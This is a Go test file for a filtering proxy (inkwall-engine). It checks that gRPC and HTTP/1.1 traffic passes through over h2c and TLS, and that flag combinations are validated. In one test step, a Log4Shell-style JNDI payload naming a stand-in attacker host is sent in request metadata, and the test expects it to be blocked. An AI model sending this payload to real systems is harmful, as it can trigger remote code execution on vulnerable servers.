// Copyright 2026 The Inkwall Authors
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"errors"
	"io"
	"log/slog"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"
	testgrpc "google.golang.org/grpc/interop/grpc_testing"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

// grpcTestService answers the calls the test makes: unary, server
// streaming and client streaming.
type grpcTestService struct {
	testgrpc.UnimplementedTestServiceServer
}

func (grpcTestService) UnaryCall(_ context.Context, in *testgrpc.SimpleRequest) (*testgrpc.SimpleResponse, error) {
	return &testgrpc.SimpleResponse{Payload: in.GetPayload()}, nil
}

func (grpcTestService) StreamingOutputCall(in *testgrpc.StreamingOutputCallRequest, s testgrpc.TestService_StreamingOutputCallServer) error {
	for _, p := range in.GetResponseParameters() {
		if err := s.Send(&testgrpc.StreamingOutputCallResponse{Payload: &testgrpc.Payload{Body: make([]byte, p.GetSize())}}); err != nil {
			return err
		}
	}
	return nil
}

func (grpcTestService) StreamingInputCall(s testgrpc.TestService_StreamingInputCallServer) error {
	total := 0
	for {
		m, err := s.Recv()
		if errors.Is(err, io.EOF) {
			return s.SendAndClose(&testgrpc.StreamingInputCallResponse{AggregatedPayloadSize: int32(total)}) // #nosec G115 -- test sizes
		}
		if err != nil {
			return err
		}
		total += len(m.GetPayload().GetBody())
	}
}

// selfSigned writes a certificate for localhost and its key to dir.
func selfSigned(t *testing.T, dir string) (certFile, keyFile string, pool *x509.CertPool, cert tls.Certificate) {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "localhost"},
		DNSNames: []string{"localhost"}, IPAddresses: []net.IP{net.IPv4(127, 0, 0, 1)},
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
		KeyUsage: x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true, IsCA: true}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		t.Fatal(err)
	}
	kder, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		t.Fatal(err)
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: kder})
	certFile, keyFile = filepath.Join(dir, "tls.crt"), filepath.Join(dir, "tls.key")
	if err := os.WriteFile(certFile, certPEM, 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(keyFile, keyPEM, 0o600); err != nil {
		t.Fatal(err)
	}
	pool = x509.NewCertPool()
	pool.AppendCertsFromPEM(certPEM)
	cert, err = tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		t.Fatal(err)
	}
	return certFile, keyFile, pool, cert
}

// TestServeProxyGRPC (#362): grpc-go calls pass through inkwall-engine
// proxy, over cleartext HTTP/2 (--h2c, --upstream-h2c) and over TLS (a TLS
// listener, an https upstream with a private CA): unary, server streaming
// and client streaming; an attack in the metadata gets PermissionDenied.
// HTTP/1.1 clients still work on the same listener.
func TestServeProxyGRPC(t *testing.T) {
	dir := t.TempDir()
	certFile, keyFile, pool, cert := selfSigned(t, dir)
	for _, tc := range []struct {
		name string
		tls  bool
	}{{"h2c", false}, {"tls", true}} {
		t.Run(tc.name, func(t *testing.T) {
			// The upstream: a gRPC server, cleartext or TLS.
			var opts []grpc.ServerOption
			if tc.tls {
				opts = append(opts, grpc.Creds(credentials.NewServerTLSFromCert(&cert)))
			}
			gs := grpc.NewServer(opts...)
			testgrpc.RegisterTestServiceServer(gs, grpcTestService{})
			upLn, err := net.Listen("tcp", "127.0.0.1:0")
			if err != nil {
				t.Fatal(err)
			}
			go func() { _ = gs.Serve(upLn) }()
			t.Cleanup(gs.Stop)

			sock := filepath.Join(t.TempDir(), "proxy.sock")
			args := []string{"--listen", "unix:" + sock, "--admin-listen", "", "--mode", "block", "--timeout", "10s"}
			if tc.tls {
				args = append(args, "--upstream", "https://localhost:"+portOf(upLn), "--upstream-ca", certFile,
					"--tls-cert", certFile, "--tls-key", keyFile)
			} else {
				args = append(args, "--upstream", "http://"+upLn.Addr().String(), "--upstream-h2c", "--h2c")
			}
			cfg, err := parseFlags(cmdProxy, args, io.Discard)
			if err != nil {
				t.Fatal(err)
			}
			ctx, cancel := context.WithCancel(context.Background())
			done := make(chan error, 1)
			go func() { done <- serve(ctx, cfg, slog.New(slog.DiscardHandler)) }()
			t.Cleanup(func() {
				cancel()
				if err := <-done; err != nil {
					t.Errorf("serve: %v", err)
				}
			})
			dial := func(ctx context.Context, _ string) (net.Conn, error) {
				for {
					c, err := (&net.Dialer{}).DialContext(ctx, "unix", sock)
					if err == nil || ctx.Err() != nil {
						return c, err
					}
					time.Sleep(20 * time.Millisecond)
				}
			}
			creds := insecure.NewCredentials()
			if tc.tls {
				creds = credentials.NewTLS(&tls.Config{RootCAs: pool, ServerName: "localhost", MinVersion: tls.VersionTLS12})
			}
			conn, err := grpc.NewClient("passthrough:///localhost", grpc.WithTransportCredentials(creds), grpc.WithContextDialer(dial))
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = conn.Close() })
			client := testgrpc.NewTestServiceClient(conn)
			callCtx, cancelCall := context.WithTimeout(context.Background(), 20*time.Second)
			defer cancelCall()

			// Unary.
			resp, err := client.UnaryCall(callCtx, &testgrpc.SimpleRequest{Payload: &testgrpc.Payload{Body: []byte("hello")}})
			if err != nil || string(resp.GetPayload().GetBody()) != "hello" {
				t.Fatalf("unary: %v %v", resp, err)
			}
			// Server streaming: three messages.
			out, err := client.StreamingOutputCall(callCtx, &testgrpc.StreamingOutputCallRequest{ResponseParameters: []*testgrpc.ResponseParameters{{Size: 1}, {Size: 2}, {Size: 3}}})
			if err != nil {
				t.Fatal(err)
			}
			for i := 1; ; i++ {
				m, err := out.Recv()
				if errors.Is(err, io.EOF) {
					if i != 4 {
						t.Fatalf("server streaming: %d messages, want 3", i-1)
					}
					break
				}
				if err != nil || len(m.GetPayload().GetBody()) != i {
					t.Fatalf("server streaming message %d: %v %v", i, m, err)
				}
			}
			// Client streaming: three messages.
			in, err := client.StreamingInputCall(callCtx)
			if err != nil {
				t.Fatal(err)
			}
			for _, n := range []int{4, 5, 6} {
				if err := in.Send(&testgrpc.StreamingInputCallRequest{Payload: &testgrpc.Payload{Body: make([]byte, n)}}); err != nil {
					t.Fatal(err)
				}
			}
			if r, err := in.CloseAndRecv(); err != nil || r.GetAggregatedPayloadSize() != 15 {
				t.Fatalf("client streaming: %v %v", r, err)
			}
			// Denied: the engine's gRPC status.
			attack := metadata.AppendToOutgoingContext(callCtx, "x-api-key", "${jndi:ldap://evil.example/a}", "x-request-id", "grpc-e2e-1")
			_, err = client.UnaryCall(attack, &testgrpc.SimpleRequest{})
			if st := status.Convert(err); st.Code() != codes.PermissionDenied || st.Message() != "Forbidden (request ID grpc-e2e-1)" {
				t.Fatalf("attack: %v, want PermissionDenied with the engine's message", st)
			}

			// HTTP/1.1 on the same listener: forwarded (the gRPC server
			// answers it, not with a gRPC response).
			tr := &http.Transport{DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) { return dial(ctx, "") }}
			scheme := "http"
			if tc.tls {
				scheme = "https"
				tr.TLSClientConfig = &tls.Config{RootCAs: pool, ServerName: "localhost", MinVersion: tls.VersionTLS12}
			}
			r, err := (&http.Client{Transport: tr, Timeout: 10 * time.Second}).Get(scheme + "://localhost/")
			if err != nil {
				t.Fatalf("HTTP/1.1: %v", err)
			}
			_ = r.Body.Close()
			if r.ProtoMajor != 1 || r.StatusCode == http.StatusForbidden || r.StatusCode == http.StatusBadGateway {
				t.Fatalf("HTTP/1.1: %s %s", r.Proto, r.Status)
			}
		})
	}
}

func portOf(l net.Listener) string {
	_, port, _ := strings.Cut(l.Addr().String(), ":")
	return port
}

func TestProxyProtocolFlags(t *testing.T) {
	for _, tc := range []struct {
		args []string
		ok   bool
	}{
		{[]string{"--upstream", "http://app", "--h2c", "--upstream-h2c"}, true},
		{[]string{"--upstream", "https://app", "--upstream-h2c"}, false},
		{[]string{"--upstream", "http://app", "--tls-cert", "c.pem"}, false},
		{[]string{"--upstream", "http://app", "--tls-key", "k.pem"}, false},
	} {
		if _, err := parseFlags(cmdProxy, tc.args, io.Discard); (err == nil) != tc.ok {
			t.Errorf("%v: %v", tc.args, err)
		}
	}
	if _, err := parseFlags(cmdForwardAuth, []string{"--h2c"}, io.Discard); err == nil {
		t.Error("forward-auth accepted --h2c")
	}
}
